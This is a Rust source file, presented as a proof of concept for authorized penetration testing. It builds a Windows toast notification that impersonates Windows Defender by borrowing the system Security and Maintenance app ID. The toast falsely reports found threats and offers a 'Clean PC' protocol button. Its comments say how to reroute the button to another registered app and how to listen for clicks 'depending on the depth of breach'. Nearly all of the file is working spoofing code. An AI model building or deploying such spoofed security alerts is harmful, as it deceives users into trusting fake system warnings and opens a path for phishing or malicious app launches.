/*
 * =========================================================================================
 * PROOF OF CONCEPT (PoC) - FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY
 * =========================================================================================
 * Description:
 * This code demonstrates how Windows Toast Notifications can be generated via the
 * windows-rs crate. It is intended for use in security research and authorized
 * penetration testing scenarios (e.g., assessing user susceptibility to spoofed
 * system notifications).
 * * Usage Warning:
 * - Use this code ONLY on systems you own or have explicit, written permission to test.
 * - Unauthorized use of this technique against third-party systems may be illegal.
 * - The author assumes no liability for misuse or damage caused by this program.
 * =========================================================================================
 */

use windows::Data::Xml::Dom::XmlDocument;
use windows::UI::Notifications::{ToastNotification, ToastNotificationManager};

fn main() -> windows::core::Result<()> {
    let app_id = "Windows.SystemToast.SecurityAndMaintenance";
    let toast_xml = r#"
    <toast scenario="reminder">
      <visual>
        <binding template="ToastGeneric">
          <text>Windows Defender Antivirus</text>
          <text>New threats were found. Click to review and take action.</text>
          <group>
            <subgroup>
                <text hint-style="captionSubtle">Security intelligence: 1.385.67.0</text>
            </subgroup>
          </group>
        </binding>
      </visual>
      <actions>
        <action content="Clean PC" arguments="action=clean" activationType="protocol"/>
        // <action content="Open Bad App" arguments="clicked=true" activationType="protocol"/>
        <action content="Dismiss" arguments="action=dismiss" activationType="system"/>
      </actions>
    </toast>
    "#;

    // If needed you can further change the commented action to enable remote calls to an app registered in windows.

    let xml_doc = XmlDocument::new()?;
    xml_doc.LoadXml(&windows::core::HSTRING::from(toast_xml))?;

    let toast = ToastNotification::CreateToastNotification(&xml_doc)?;
    let notifier = ToastNotificationManager::CreateToastNotifierWithId(&windows::core::HSTRING::from(app_id))?;

    // Additionally depending on the depth of breach you can also listen for the call before popping
    // the notification and deciding what to do afterward.
    // toast.Activated(&TypedEventHandler::new(|sender,args|{notifier.Show(&toast)?; Ok(())}))?;

    notifier.Show(&toast)?;
    println!("PoC sent. Should be visible.");

    Ok(())
}
